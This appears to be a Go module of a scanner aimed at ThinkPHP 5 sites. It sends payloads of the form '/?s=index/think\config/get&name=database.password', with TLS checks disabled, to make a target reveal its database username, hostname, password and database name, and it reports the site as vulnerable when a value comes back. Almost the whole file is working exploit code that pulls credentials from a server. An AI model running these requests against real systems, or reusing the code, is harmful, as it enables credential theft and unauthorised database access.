package main

import (
	"crypto/tls"
	"fmt"
	"io"
	"net/http"
	"strings"
	"time"
)

var payloads5 []string

//payload: /?s=index/think\config/get&name=database.database
// database.hostname     database.password    database.database

func tp5_sql(baseurl string)  {
	flag := tp5_sql1(baseurl) //接受返回的payload
	if  flag != "0"{
		fmt.Println(baseurl," [+] vul ! ! !\npayload: ",flag)
	} else {
		fmt.Println(baseurl," [-] not vull tpV5_sql")
	}
}

func tp5_sql1(baseurl string) string  {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	payloads5 := append(payloads5,
		"/?s=index/think\\config/get&name=database.username",
		"/?s=index/think\\config/get&name=database.hostname",
		"/?s=index/think\\config/get&name=database.password",
		"/?s=index/think\\config/get&name=database.database")
	for _, payload := range payloads5{
		flag := tp5_sql2(baseurl, payload)
		if flag != "0"{
			return flag
		}
		url := baseurl + "/public/index.php"+payload
		client := http.Client{
			Transport:     tr,
			CheckRedirect: nil,
			Jar:           nil,
			Timeout:       time.Second*5,
		}
		req, err := http.NewRequest("GET",url,nil)
		if err != nil {
			return "0"
		}
		req.Header.Set("User-Agent",user_agent)
		resp, err := client.Do(req)
		if err != nil {
			fmt.Println("[-] 请求超时，请检查url！ x.x")
			return "0"
		}
		body, _ := io.ReadAll(resp.Body)
		if (resp.StatusCode == 200){
			if (!strings.Contains(string(body)," ")){
				return payload
			}
		} else {
			return "0"
		}
	}
	return "0"
}

func tp5_sql2(baseurl string,payload string) string {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	url := baseurl + payload
	client := http.Client{
		Transport:     tr,
		CheckRedirect: nil,
		Jar:           nil,
		Timeout:       time.Second*5,
	}
	req, err := http.NewRequest("GET",url,nil)
	if err != nil {
		return "0"
	}
	req.Header.Set("User-Agent",user_agent)
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("[-] 请求超时，请检查url！ x.x")
		return "0"
	}
	body, _ := io.ReadAll(resp.Body)
	if (resp.StatusCode == 200){
		if (!strings.Contains(string(body)," ")){
			return payload
		}else {
			return "0"
		}
	} else {
		return "0"
	}
}
